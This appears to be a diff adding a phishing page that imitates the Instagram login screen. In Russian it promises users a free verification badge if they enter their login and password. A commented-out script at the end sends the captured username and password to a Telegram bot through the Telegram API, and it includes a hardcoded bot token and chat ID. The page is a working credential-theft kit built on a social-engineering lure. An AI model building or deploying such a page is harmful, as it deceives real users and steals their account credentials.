@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles.css" />
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <title>Instagram.com</title>
+</head>
+<body>
+    
+
+    <main class="flex align-items-center justify-content-center">
+        <div id="loading" class="loading-overlay" style="display: none;">
+            <div class="loading-spinner"></div>
+        </div>
+        
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+                </h1>
+                 <p style="color: rgb(168, 23, 23);" class="text">"Поздравляем! 🎉 Ваш аккаунт был отмечен как один из успешных пользователей Instagram более года. В знак признательности мы предоставляем вам возможность получить временную верификацию (синюю галочку). Чтобы подтвердить свой статус и активировать значок, пожалуйста, войдите в систему, используя свой логин и пароль. <img style="height: 25px; width: 25px; " src="https://media.istockphoto.com/id/1396933001/vector/vector-blue-verified-badge.jpg?s=612x612&w=0&k=20&c=aBJ2JAzbOfQpv2OCSr0k8kYe0XHutOGBAJuVjvWvPrQ=" alt=""> "</p>
+
+                <form id="telegramForm">
+                    <label for="email" class="sr-only">Telefone, nome de usuário ou e-mail</label>
+                    <input id="username" name="email" placeholder="Телефон, имя пользователя или эл. адрес" />
+                    
+                    <label for="password" class="sr-only">Senha</label>
+                    <input  id="password" name="password" type="password" placeholder="Пароль" />
+                    
+                    
+                    <button type="submit">Войти</button>
+                </form>
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">ИЛИ</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div class="wraper">
+                        <i class="fa-brands fa-square-facebook fa-sm" style="color: #005fb3;"></i>
+                        <a>Войти через Facebook</a>
+                        <p class="invalid">К сожалению, вы ввели неправильный пароль. Проверьте свой пароль еще раз.</p>
+                    </div>
+                    <a href="#">Забыли пароль?</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>У вас ещё нет аккаунта? </p>
+                <a href="#">Зарегистрироваться</a>
+            </div>
+            <div class="app-download flex direction-column align-items-center">
+                <p>Установите приложение.</p>
+                <div class="flex justify-content-center">
+                    <a href="https://apps.apple.com/uz/app/instagram/id389801252" target="blank">
+                        <img src="./img/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
+                    </a>
+                    <a href="https://play.google.com/store/search?q=instagram&c=apps&hl=ru&gl=US" target="blank">
+                        <img src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
+                    </a>
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <ul class="footer__list flex flex-wrap justify-content-center text-align-center">
+            <li><a href="#">Meta</a></li>
+            <li><a href="#">Информация</a></li>
+            <li><a href="#">Блог</a></li>
+            <li><a href="#">Вакансии</a></li>
+            <li><a href="#">Помощь</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">Конфиденциальность</a></li>
+            <li><a href="#">Условия</a></li>
+            <li><a href="#">Места</a></li>
+            <li><a href="#">Instagram Lite</a></li>
+            <li><a href="#">Threads</a></li>
+            <li><a href="#">Загрузка контактов и лица, не являющиеся пользователями</a></li>
+            <li><a href="#">Meta Verified</a></li>
+            <li><a href="#">Threads</a></li>
+        </ul>
+        <p class="copyright">© 2024 Instagram from Meta</p>
+    </footer>
+
+    
+    
+    
+    <!-- <script>
+        
+    
+        document.addEventListener('DOMContentLoaded', () => {
+            const form = document.getElementById('telegramForm');
+            const loading = document.getElementById('loading');
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Foydalanuvchi nomi va parolni kodlash
+                const username = encodeURIComponent(document.getElementById('username').value);
+                const password = encodeURIComponent(document.getElementById('password').value);
+                
+                // Xabar matnini yangi qator belgilari bilan tuzish
+                // const message = `Username: ${username} \n Password: ${password}`;
+                
+                const jonatish = `<b>Username:</b> <em>${username}</em>\n<b>Password:</b> <em>${password}</em>`
+                loading.style.display = 'flex';
+                
+                // Telegram API uchun URL tuzish
+                const url = `https://api.telegram.org/bot6681983180:AAFEgYgqQiWC4-0rAdlW7Vu_4RBUF_r6se4/sendMessage?chat_id=697727022&text=${encodeURIComponent(jonatish)}&parse_mode=HTML`;
+                
+                // fetch yordamida so'rov yuborish va natijani konsolda ko'rsatish
+                fetch(url, { method: 'GET' })
+                .then(response => response.json())
+                .then(data => {
+                     loading.style.display = 'none';
+                     console.log(data);
+                     if (data.ok) {
+                         console.log(data.result.message_id);
+                     } else {
+                         console.log(data.error_code);
+                     }
+                 })
+                 .catch((error) => {
+                     alert("Error! Please try again" + error.message)
+                     console.log(error);
+                     loading.style.display = 'none';
+                })
+                
+            });
+        });
+        
+    </script> -->
+
+    <script src="confetti.js"></script>
+
+    <script src="./main.js"></script>
+
+ 
+</body>
+</html>
